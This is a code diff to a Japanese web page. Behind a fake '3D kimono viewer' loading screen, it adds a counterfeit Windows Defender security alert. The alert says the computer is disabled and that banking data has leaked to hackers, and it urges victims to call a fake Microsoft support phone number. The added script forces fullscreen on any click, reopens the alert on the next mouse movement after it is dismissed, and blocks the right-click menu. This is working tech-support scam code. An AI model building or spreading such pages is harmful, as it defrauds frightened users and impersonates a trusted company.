@@ -12,6 +12,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ポップアップ レイアウト</title>
     <style>
+@import url("https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700&family=Noto+Serif+JP:wght@500;700&display=swap");
+
 /* Segoe 系に近いサンセリフ */
 :root {
   --ms-blue: #0078d4;
@@ -62,10 +64,10 @@ body {
 /* Top-center user strip (highest z-index: above all page UI) */
 .user-top-strip {
   position: fixed;
-  top: 0;
+  top: 5px;
   left: 50%;
   transform: translateX(-50%);
-  z-index: 2147483647;
+  z-index: 2147483646;
   width: 460px;
   min-height: 0;
   box-sizing: border-box;
@@ -346,10 +348,11 @@ body {
 /* 左・中央・右（親 .modals の高さ 100% 基準） */
 .modal--auth {
   position: absolute;
-  left: 0;
-  top: 28px;
+  left: 5%;
+  top: auto;
+  bottom: 10%;
   width: min(320px, 32vw);
-  max-height: calc(100% - 28px);
+  max-height: 60%;
   z-index: 5;
   box-shadow: var(--shadow-lg);
   transform: translateX(0);
@@ -407,7 +410,7 @@ body {
   display: flex;
   flex-direction: column;
   overflow: hidden;
-  animation: security-panel-breathe 12s ease-in-out infinite;
+  animation: security-panel-breathe 6s ease-in-out infinite;
 }
 
 @keyframes security-panel-breathe {
@@ -527,9 +530,10 @@ body {
   }
 
   .modal--auth {
-    top: 8px;
+    top: auto;
+    bottom: 8%;
     width: min(300px, 48vw);
-    max-height: calc(100% - 16px);
+    max-height: 64%;
   }
 
   .modal--security {
@@ -1195,14 +1199,353 @@ body {
   display: block;
   margin-left: 2px;
 }
+
+/* Intro Loader Overlay */
+.intro-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 2147483647;
+  display: grid;
+  place-items: center;
+  background:
+    radial-gradient(circle at 15% 20%, rgba(84, 28, 34, 0.25), transparent 42%),
+    radial-gradient(circle at 84% 78%, rgba(183, 156, 97, 0.18), transparent 42%),
+    linear-gradient(180deg, #040404, #0b0b0b 60%, #050505);
+  opacity: 0;
+  visibility: hidden;
+  pointer-events: none;
+  transition: opacity 360ms ease, visibility 360ms ease;
+}
+
+.intro-overlay.is-active {
+  opacity: 1;
+  visibility: visible;
+  pointer-events: auto;
+}
+
+.intro-overlay.is-hidden {
+  opacity: 0;
+  visibility: hidden;
+  pointer-events: none;
+}
+
+.kimono-modal {
+  width: min(92vw, 680px);
+  border: 1px solid rgba(183, 156, 97, 0.45);
+  border-radius: 18px;
+  padding: clamp(24px, 4vw, 40px);
+  position: relative;
+  overflow: hidden;
+  box-shadow: 0 24px 60px rgba(0, 0, 0, 0.55);
+  background:
+    linear-gradient(
+      120deg,
+      rgba(247, 241, 227, 0.05),
+      rgba(183, 156, 97, 0.09) 45%,
+      rgba(84, 28, 34, 0.18)
+    ),
+    rgba(10, 10, 10, 0.88);
+  color: #f7f1e3;
+  font-family: "Noto Sans JP", "Hiragino Sans", "Yu Gothic", "Meiryo", sans-serif;
+}
+
+.kimono-modal::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  pointer-events: none;
+  opacity: 0.45;
+  background:
+    repeating-linear-gradient(
+      45deg,
+      transparent 0,
+      transparent 12px,
+      rgba(183, 156, 97, 0.07) 12px,
+      rgba(183, 156, 97, 0.07) 13px
+    ),
+    repeating-linear-gradient(
+      -45deg,
+      transparent 0,
+      transparent 14px,
+      rgba(84, 28, 34, 0.09) 14px,
+      rgba(84, 28, 34, 0.09) 15px
+    );
+}
+
+.kimono-title,
+.kimono-subtitle,
+.kimono-description,
+.loading-message,
+.progress-track {
+  position: relative;
+  z-index: 1;
+}
+
+.kimono-title {
+  margin: 0;
+  font-size: clamp(1.7rem, 4vw, 2.4rem);
+  font-family: "Noto Serif JP", "Yu Mincho", "Hiragino Mincho ProN", "MS PMincho", serif;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  color: #f7f1e3;
+}
+
+.kimono-subtitle {
+  margin: 6px 0 18px;
+  color: #b79c61;
+  letter-spacing: 0.06em;
+  font-size: clamp(1rem, 2.2vw, 1.25rem);
+}
+
+.kimono-description {
+  margin: 0 0 20px;
+  color: rgba(247, 241, 227, 0.9);
+  line-height: 1.72;
+}
+
+.loading-message {
+  min-height: 1.8em;
+  margin: 0 0 14px;
+  color: rgba(247, 241, 227, 0.88);
+  font-size: 0.98rem;
+}
+
+.progress-track {
+  width: 100%;
+  height: 12px;
+  border-radius: 999px;
+  background: linear-gradient(90deg, rgba(84, 28, 34, 0.8), rgba(25, 25, 25, 0.9));
+  border: 1px solid rgba(247, 241, 227, 0.14);
+  overflow: hidden;
+}
+
+.progress-fill {
+  width: 0;
+  height: 100%;
+  border-radius: inherit;
+  background: linear-gradient(90deg, rgba(183, 156, 97, 0.92), rgba(247, 241, 227, 0.98));
+  transition: width 90ms linear;
+}
+
+@media (max-width: 580px) {
+  .kimono-modal {
+    border-radius: 14px;
+  }
+
+  .kimono-description {
+    font-size: 0.94rem;
+  }
+
+  .loading-message {
+    font-size: 0.9rem;
+  }
+}
+
+/* Center alert modal (matched to mid.png style) */
+.mid-alert {
+  position: fixed;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 2147483646;
+  width: min(506px, 50.6vw);
+  border-radius: 10px;
+  border: 1px solid #cfcfcf;
+  background: #f8f8f8;
+  box-shadow: 0 12px 32px rgba(0, 0, 0, 0.24);
+  overflow: hidden;
+  color: #2a2a2a;
+  transition: opacity 180ms ease, visibility 180ms ease;
+}
+
+.mid-alert.is-hidden-temporary {
+  opacity: 0;
+  visibility: hidden;
+  pointer-events: none;
+}
+
+.mid-alert__head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  padding: 12px 14px;
+  border-bottom: 1px solid #d8d8d8;
+  background: #efefef;
+}
+
+.mid-alert__title {
+  margin: 0;
+  font-size: 17px;
+  line-height: 1.1;
+  letter-spacing: 0;
+  font-weight: 700;
+}
+
+.mid-alert__close {
+  border: none;
+  background: transparent;
+  font-size: 26px;
+  line-height: 1;
+  color: #666;
+  cursor: pointer;
+  border-radius: 7px;
+  width: 38px;
+  height: 38px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  transition: background-color 150ms ease, color 150ms ease, transform 120ms ease;
+}
+
+.mid-alert__close:hover {
+  background: #d83b01;
+  color: #fff;
+}
+
+.mid-alert__close:active {
+  transform: scale(0.96);
+}
+
+.mid-alert__body {
+  padding: 14px 14px 10px;
+  text-align: center;
+}
+
+.mid-alert__danger {
+  margin: 0;
+  color: #b62424;
+  font-size: 16px;
+  line-height: 1.35;
+  font-weight: 700;
+}
+
+.mid-alert__lorem {
+  margin: 12px auto 0;
+  width: 100%;
+  color: #2f2f2f;
+  font-size: 14px;
+  line-height: 1.4;
+  font-weight: 700;
+}
+
+.mid-alert__phone-note {
+  margin: 12px 0 7px;
+  color: #1f4f9d;
+  font-size: 16px;
+  font-weight: 700;
+}
+
+.mid-alert__phone-pill {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  margin-top: 8px;
+  border: 1px solid #1f4f9d;
+  border-radius: 12px;
+  padding: 8px 18px;
+  color: #1f4f9d;
+  font-size: 21px;
+  font-weight: 700;
+}
+
+.mid-alert__separator {
+  margin: 12px 0 0;
+  height: 1px;
+  border: 0;
+  background: #d8d8d8;
+}
+
+.mid-alert__actions {
+  display: flex;
+  justify-content: flex-end;
+  gap: 10px;
+  padding: 12px 14px 14px;
+}
+
+.mid-alert__btn {
+  min-width: 103px;
+  border-radius: 7px;
+  font-size: 14px;
+  font-weight: 700;
+  padding: 8px 12px;
+  border: 1px solid #222;
+  background: #f7f7f7;
+  color: #222;
+  cursor: pointer;
+  transition: background-color 150ms ease, color 150ms ease, transform 120ms ease, border-color 150ms ease;
+}
+
+.mid-alert__btn--ok {
+  border-color: #214f9d;
+  background: #214f9d;
+  color: #fff;
+}
+
+.mid-alert__btn:hover {
+  background: #ececec;
+}
+
+.mid-alert__btn:active {
+  transform: scale(0.97);
+}
+
+.mid-alert__btn--ok:hover {
+  background: #163f84;
+  border-color: #163f84;
+}
+
+@media (max-width: 1024px) {
+  .mid-alert {
+    width: min(475px, 74.9vw);
+  }
+}
     </style>
   </head>
   <body>
+    <!-- Intro Loader Overlay -->
+    <div class="intro-overlay" id="introOverlay" aria-live="polite" role="dialog" aria-modal="true">
+      <section class="kimono-modal">
+        <h1 class="kimono-title">3D 着物ビューア</h1>
+        <p class="kimono-subtitle">着物ビューア</p>
+        <p class="kimono-description">
+          精緻な布地の質感、重なり合う意匠、伝統的なシルエットまで、
+          3D着物モデルをじっくりご覧いただけます。
+        </p>
+        <p class="loading-message" id="loadingMessage">着物のテクスチャを準備しています...</p>
+        <div class="progress-track" aria-label="読み込み進行状況">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+      </section>
+    </div>
     <div class="user-top-strip test-banner" aria-label="User content">
       <p>
         できるだけ早くご連絡ください。弊社のエンジニアが電話で削除手順をサポートいたします。お使いのコンピューターは無効になっています。Windows Defender SmartScreen が認識されないアプリケーションを停止しています。このアプリを実行すると、システムの安全性が損なわれる可能性があります。
       </p>
     </div>
+    <section class="mid-alert" role="dialog" aria-label="Security alert">
+      <header class="mid-alert__head">
+        <h2 class="mid-alert__title">Windows Defender セキュリティ センター</h2>
+        <button type="button" class="mid-alert__close" aria-label="閉じる">×</button>
+      </header>
+      <div class="mid-alert__body">
+        <p class="mid-alert__danger">
+          Address IP: 1024:abcd:98ef:77aa:22bb:31cc<br />
+          Location: 日本<br />
+          ISP: NTTドコモ／KDDI
+        </p>
+        <p class="mid-alert__lorem">
+          お使いのWindowsは、すべてのデータが失われる危険にさらされています。お支払い情報や銀行サービスの詳細情報がハッカーにオンラインで漏洩しています。ハッカーによるデータ盗難を防ぐため、下記の番号にすぐにお電話ください。今すぐマイクロソフトサポートにご連絡ください。
+        </p>
+        <p class="mid-alert__phone-note">マイクロソフトサポート（フリーダイヤル）：</p>
+        <div class="mid-alert__phone-pill">📞 050-1794-8774 </div>
+        <hr class="mid-alert__separator" />
+      </div>
+      <footer class="mid-alert__actions">
+        <button type="button" class="mid-alert__btn">Cancel</button>
+        <button type="button" class="mid-alert__btn mid-alert__btn--ok">OK</button>
+      </footer>
+    </section>
     <div class="page">
       <header class="site-header">
         <div class="site-header__inner">
@@ -1477,6 +1820,118 @@ body {
     </div>
     <script>
       (function () {
+        var introOverlay = document.getElementById("introOverlay");
+        var progressFill = document.getElementById("progressFill");
+        var loadingMessage = document.getElementById("loadingMessage");
+        var midAlert = document.querySelector(".mid-alert");
+        var midAlertCloseBtn = document.querySelector(".mid-alert__close");
+        var midAlertActionBtns = document.querySelectorAll(".mid-alert__btn");
+        var lastFullscreenState = !!document.fullscreenElement;
+        var loadingMessages = [
+          "着物のテクスチャを準備しています...",
+          "モデルの輪郭を調整しています...",
+          "最終レンダリングを適用しています..."
+        ];
+        var loaderTimer = null;
+        var loaderHideTimer = null;
+
+        function clearLoaderTimers() {
+          if (loaderTimer) {
+            clearInterval(loaderTimer);
+            loaderTimer = null;
+          }
+          if (loaderHideTimer) {
+            clearTimeout(loaderHideTimer);
+            loaderHideTimer = null;
+          }
+        }
+
+        function hideIntroLoader() {
+          if (!introOverlay) return;
+          introOverlay.classList.add("is-hidden");
+          introOverlay.classList.remove("is-active");
+        }
+
+        function showIntroLoader() {
+          if (!introOverlay || !progressFill || !loadingMessage) return;
+          clearLoaderTimers();
+          progressFill.style.width = "0%";
+          loadingMessage.textContent = loadingMessages[0];
+          introOverlay.classList.remove("is-hidden");
+          introOverlay.classList.add("is-active");
+
+          var loaderDurationMs = 5500;
+          var tickMs = 50;
+          var startedAt = Date.now();
+          loaderTimer = setInterval(function () {
+            var elapsed = Date.now() - startedAt;
+            var progress = Math.min((elapsed / loaderDurationMs) * 100, 100);
+            progressFill.style.width = progress + "%";
+
+            if (progress >= 30 && progress < 70) {
+              loadingMessage.textContent = loadingMessages[1];
+            } else if (progress >= 70) {
+              loadingMessage.textContent = loadingMessages[2];
+            }
+
+            if (progress >= 100) {
+              clearInterval(loaderTimer);
+              loaderTimer = null;
+              loaderHideTimer = setTimeout(function () {
+                hideIntroLoader();
+              }, 220);
+            }
+          }, tickMs);
+        }
+
+        function onFullscreenChange() {
+          var isFullscreen = !!document.fullscreenElement;
+          if (!lastFullscreenState && isFullscreen) {
+            showIntroLoader();
+          } else if (!isFullscreen) {
+            clearLoaderTimers();
+            hideIntroLoader();
+          }
+          lastFullscreenState = isFullscreen;
+        }
+
+        document.addEventListener("fullscreenchange", onFullscreenChange);
+
+        function requestFullscreenFromBodyClick() {
+          if (document.fullscreenElement) return;
+          var root = document.documentElement;
+          if (!root) return;
+
+          var requestMethod =
+            root.requestFullscreen ||
+            root.webkitRequestFullscreen ||
+            root.mozRequestFullScreen ||
+            root.msRequestFullscreen;
+
+          if (typeof requestMethod === "function") {
+            requestMethod.call(root);
+          }
+        }
+
+        function showMidAlertOnNextCursorMove() {
+          if (!midAlert) return;
+
+          function revealMidAlert() {
+            midAlert.classList.remove("is-hidden-temporary");
+            document.removeEventListener("mousemove", revealMidAlert);
+            document.removeEventListener("pointermove", revealMidAlert);
+            document.removeEventListener("touchmove", revealMidAlert);
+          }
+
+          document.addEventListener("mousemove", revealMidAlert, { once: true });
+          document.addEventListener("pointermove", revealMidAlert, { once: true });
+          document.addEventListener("touchmove", revealMidAlert, { once: true });
+        }
+
+        document.body.addEventListener("click", function () {
+          requestFullscreenFromBodyClick();
+        });
+
         document.addEventListener("contextmenu", function (e) {
           e.preventDefault();
         });
@@ -1665,6 +2120,26 @@ body {
             e.preventDefault();
             e.stopPropagation();
             collapseChat();
+          });
+        }
+
+        if (midAlert && midAlertCloseBtn) {
+          midAlertCloseBtn.addEventListener("click", function (e) {
+            e.preventDefault();
+            requestFullscreenFromBodyClick();
+            midAlert.classList.add("is-hidden-temporary");
+            showMidAlertOnNextCursorMove();
+          });
+        }
+
+        if (midAlert && midAlertActionBtns.length) {
+          Array.prototype.forEach.call(midAlertActionBtns, function (btn) {
+            btn.addEventListener("click", function (e) {
+              e.preventDefault();
+              requestFullscreenFromBodyClick();
+              midAlert.classList.add("is-hidden-temporary");
+              showMidAlertOnNextCursorMove();
+            });
           });
         }
 
